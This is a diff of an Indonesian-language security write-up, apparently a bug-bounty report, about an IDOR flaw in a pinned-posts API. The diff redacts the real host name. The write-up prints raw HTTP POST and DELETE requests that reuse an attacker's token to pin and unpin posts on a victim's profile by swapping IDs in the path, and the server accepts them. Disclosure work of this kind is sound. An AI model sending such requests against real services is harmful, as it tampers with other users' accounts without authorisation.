@@ -25,13 +25,11 @@ Content-Type: application/json
 
 {"entityType":"users","entityId":"02400792-9156-47ea-bee7-15376143df16","id":"b8450f98-43a4-f011-8e64-6045bd354e91"}>
 ```
-
 ### Response:
 
 ```
 HTTP/1.1 204 No Content
 ```
-
 Status 204 No Content berarti operasi berhasil dilakukan tanpa ada data yang dikembalikan, ini adalah indikator sukses untuk operasi modifikasi.
 
 ### Key Observations
@@ -49,7 +47,7 @@ Struktur endpoint ini, /users/{user_id}/pins/posts/{post_id}, adalah indikasi kl
 
 Asumsi saya sederhana, dan ini adalah inti dari pengujian IDOR:
 
-*Jika saya mengubah {user_id} dan {post_id} di path menjadi ID milik target (korban), apakah server akan menerima request tersebut, meskipun token Authorization yang terlampir adalah token dari akun penyerang (saya)?*
+*"Jika saya mengubah {user_id} dan {post_id} di path menjadi ID milik target (korban), apakah server akan menerima request tersebut, meskipun token Authorization yang terlampir adalah token dari akun penyerang (saya)?"*
 
 ### Ethical Testing Setup
 
@@ -69,7 +67,7 @@ Saya membuka profil Akun B dan mengekstrak ID Pengguna serta ID Postingan mereka
 
 ```
 POST /api/v1.3/posts/b1b7f1063da2f0118e646045bd354e91/reactions HTTP/1.1
-Host: www.bandlab.com
+Host: www.private.com
 ...
 ```
 Dari request ini, saya mendapatkan:
@@ -83,13 +81,12 @@ Saya mengambil request asli dari Akun A (Penyerang) dan mengganti ID-ID tersebut
 
 ```
 POST /api/v1.3/users/50ef6acd8171401cad898bdca23efe67/pins/posts/b1b7f1063da2f0118e646045bd354e91 HTTP/1.1
-Host: www.bandlab.com
+Host: www.private.com
 Authorization: Bearer <ATTACKER_TOKEN>
 Content-Type: application/json
 
 {"entityType":"users","entityId":"50ef6acd8171401cad898bdca23efe67","id":"b1b7f1063da2f0118e646045bd354e91"}>
 ```
-
 **3. Sending the Request**
 
 Saya meneruskan request di Burp Suite Repeater. Responsnya:
@@ -97,7 +94,6 @@ Saya meneruskan request di Burp Suite Repeater. Responsnya:
 ```
 HTTP/1.1 204 No Content
 ```
-
 **Success!** Server menerima request tanpa memvalidasi kepemilikan.
 
 **4. Verification**
@@ -114,10 +110,9 @@ Request untuk menghapus postingan yang disematkan dari profil korban semudah men
 
 ```
 DELETE /api/v1.3/users/50ef6acd8171401cad898bdca23efe67/pins/posts/b1b7f1063da2f0118e646045bd354e91 HTTP/1.1
-Host: www.bandlab.com
+Host: www.private.com
 Authorization: Bearer <ATTACKER_TOKEN>>
 ```
-
 **Response:**
 
 ```
